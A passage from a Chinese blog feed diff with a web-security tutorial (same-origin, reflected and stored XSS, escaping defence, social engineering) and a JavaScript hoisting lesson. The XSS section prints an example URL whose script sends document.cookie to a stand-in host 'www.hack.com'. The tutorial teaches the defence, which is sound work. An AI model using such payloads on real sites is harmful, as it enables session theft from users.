+&lt;td&gt;&lt;a href=&quot;http://www.xxx.com/a.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.xxx.com/a.js&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;同源&lt;/td&gt;
+&lt;td&gt;域名，协议，端口相同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&quot;XSS注入攻击&quot;&gt;&lt;a href=&quot;#XSS注入攻击&quot; class=&quot;headerlink&quot; title=&quot;XSS注入攻击&quot;&gt;&lt;/a&gt;XSS注入攻击&lt;/h3&gt;&lt;p&gt;XSS(Cross Site Scripting)，跨站脚本攻击，与SQL注入攻击类似，恶意用户，在一些公共区域（例如，论坛，评论）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1.反射型XSS&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://www.xxx.com/test.jsp页面内容如下：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;页面内容：&amp;lt;%=request.getParameter(&amp;quot;content&amp;quot;)%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;反射注入请求URL:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http://www.xxx.com/test.jsp?content=&amp;lt;script&amp;gt;window.open(&amp;quot;www.hack.com?param=&amp;quot;+document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;2.持久型XSS&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;持久型XSS攻击一般存在于展示用户输入的页面（如评论页），这些数据会存储到网站服务器后台数据库，所以也叫存储型XSS。&lt;/p&gt;
+&lt;p&gt;以下是个人测试网票网的评论页存在持久型XSS注入的截图。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040601.png&quot; alt=&quot;csrf&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040602.png&quot; alt=&quot;csrf&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;XSS防御&quot;&gt;&lt;a href=&quot;#XSS防御&quot; class=&quot;headerlink&quot; title=&quot;XSS防御&quot;&gt;&lt;/a&gt;XSS防御&lt;/h3&gt;&lt;p&gt;对用户提交的数据中的html标签特殊字符编码处理。&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;switch(c) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;case &amp;apos;&amp;amp;&amp;apos;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return&amp;quot;&amp;amp;amp;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;case &amp;apos;&amp;lt;&amp;apos;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return&amp;quot;&amp;amp;lt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;case &amp;apos;&amp;gt;&amp;apos;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return&amp;quot;&amp;amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;case &amp;apos;&amp;quot;&amp;apos;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return&amp;quot;&amp;amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;case &amp;apos; &amp;apos;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return&amp;quot;&amp;amp;nbsp;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;default:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return c +&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;社会工程学&quot;&gt;&lt;a href=&quot;#社会工程学&quot; class=&quot;headerlink&quot; title=&quot;社会工程学&quot;&gt;&lt;/a&gt;社会工程学&lt;/h3&gt;&lt;p&gt;社会工程学以顺从你的意愿、满足你的欲望的方式，让你上当的一些方法、一门艺术与学问。&lt;br&gt;一种利用人的本能反应、好奇心、信任、贪便宜等弱点进行诸如欺骗、伤害等危害手段，获取自身利益的手法。&lt;/p&gt;
+&lt;p&gt;社会工程攻击不是传统的信息安全的范畴，也被称为 “非传统信息安全”.&lt;/p&gt;
+&lt;p&gt;信息安全预测：&lt;br&gt;“社会工程学是未来最大信息系统入侵与反入侵对抗领域，许多破坏力最大的行为是由于社会工程学&lt;br&gt;而不是黑客或破坏行为造成的。”&lt;/p&gt;
+&lt;p&gt;近年代表应用：&lt;br&gt;1.免费下载软件中捆绑流氓软件&lt;br&gt;2.免费音乐中包含病毒&lt;br&gt;3.网络钓鱼&lt;br&gt;4.垃圾电子邮件中的恶意链接或间谍软件&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;CSRF概述&quot;&gt;&lt;a href=&quot;#CSRF概述&quot; class=&quot;headerlink&quot; title=&quot;CSRF概述&quot;&gt;&lt;/a&gt;CSRF概述&lt;/h3&gt;&lt;p&gt;CSRF(Cross-Site Request Forgery)，翻译过来叫做跨站请求伪造。是一种挟制终端用
+    
+    </summary>
+    
+      <category term="学习" scheme="http://yoursite.com/categories/learning/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Javascript中声明提升和链式作用域</title>
+    <link href="http://yoursite.com/javascript/javascript/javascript%E4%B8%AD%E5%A3%B0%E6%98%8E%E6%8F%90%E5%8D%87%E5%92%8C%E5%87%BD%E6%95%B0%E4%BD%9C%E7%94%A8%E5%9F%9F.html"/>
+    <id>http://yoursite.com/javascript/javascript/javascript中声明提升和函数作用域.html</id>
+    <published>2015-03-14T16:00:00.000Z</published>
+    <updated>2016-04-19T10:12:56.915Z</updated>
+    
+    <content type="html">&lt;h3 id=&quot;声明提升的定义&quot;&gt;&lt;a href=&quot;#声明提升的定义&quot; class=&quot;headerlink&quot; title=&quot;声明提升的定义&quot;&gt;&lt;/a&gt;声明提升的定义&lt;/h3&gt;&lt;p&gt;声明提升就是将变量和函数的声明提升到作用域的顶端定义，&lt;strong&gt;但不赋值&lt;/strong&gt;。&lt;/p&gt;
+&lt;h3 id=&quot;变量声明提升&quot;&gt;&lt;a href=&quot;#变量声明提升&quot; class=&quot;headerlink&quot; title=&quot;变量声明提升&quot;&gt;&lt;/a&gt;变量声明提升&lt;/h3&gt;&lt;p&gt;我们先看一个简单的例子&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	console.log(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	a=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	console.log(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;就问你这两段控制台是不是输出1，是，就是这么傲娇的肯定。答对了，状态不错，我们稍微修改下上面的代码&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	console.log(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	console.log(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	a=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;上面的代码我们将控制台输出语句跟变量声明换了个位置，而且我还换了个值，就问你这个会打印什么？&lt;br&gt;是2？天真！！！这里第一个输出的是&lt;strong&gt;undefined&lt;/strong&gt;，第二个&lt;strong&gt;undefined&lt;/strong&gt;都不会输出直接报错。为什么会出现这种情况呢？这里就涉及到了javascript中的声明提升的概念了。&lt;/p&gt;
+&lt;p&gt;我们知道&lt;strong&gt;var a=2;&lt;/strong&gt;是一个变量声明，根据前面的声明提升的定义，可以知道，这句代码里的a变量会提升到作用于顶端定义，因此下面两段代码是等价的。&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	console.log(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;等价于&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	console.log(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	a=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;由于变量声明中提升到顶端的只是变量的定义，不会赋值，所以这里打印&lt;strong&gt;undefined&lt;/strong&gt;就在情理之中了。如果事先没有定义这个变量，我们使用了，运行的时候就会报错。&lt;/p&gt;
+&lt;h3 id=&quot;函数声明提升&quot;&gt;&lt;a href=&quot;#函数声明提升&quot; class=&quot;headerlink&quot; title=&quot;函数声明提升&quot;&gt;&lt;/a&gt;函数声明提升&lt;/h3&gt;&lt;p&gt;和变量声明一样，函数的声明也会被提升。&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	functest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var functest=function()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		console.log(&quot;functest&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;等价于&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var functest;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	functest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	functest=function()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		console.log(&quot;functest&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;上面&lt;strong&gt;var functest=function(){…}&lt;/strong&gt;的方式定义的函数不是函数声明，而是函数表达式，虽然变量&lt;strong&gt;functest&lt;/strong&gt;的定义也会被提升，但是并没有将对应的匿名函数的引用赋值给它，所以执行的时候会报出错误信息:&lt;strong&gt;TypeError: funtest is not a function&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;下面来看下函数声明的提升&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	funtest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	function funtest()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		console.log(&quot;funtest&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;等价于&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	function funtest()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		console.log(&quot;funtest&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	funtest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;关键字function+函数名称+函数体，这种方式定义的函数就是我们所说的函数声明。可以看到这种方式定义的函数，不管调用执行它的代码在它前面还是后面都能正确的找到相关函数的引用，并执行。&lt;/p&gt;
